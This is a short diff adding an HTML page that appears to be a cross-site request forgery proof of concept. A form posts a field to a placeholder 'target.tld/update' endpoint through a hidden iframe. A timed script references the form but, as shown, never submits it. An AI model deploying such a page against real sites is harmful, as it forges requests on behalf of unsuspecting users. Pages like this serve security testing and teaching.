@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<body>
+<iframe style="display:none;" name="csrf-form"></iframe> 
+<form method="post" action="http://target.tld/update" id="csrf" target="csrf-form">
+    enter the color name: <input type="text" name="color" id="red">
+    <button class="btn" type="submit">submit button </button>
+
+</form>
+
+
+
+<script>
+    setTimeout(()=>{
+        document.getElementById("csrf")
+    },1000)
+</script>
+
+</body>
+</html>
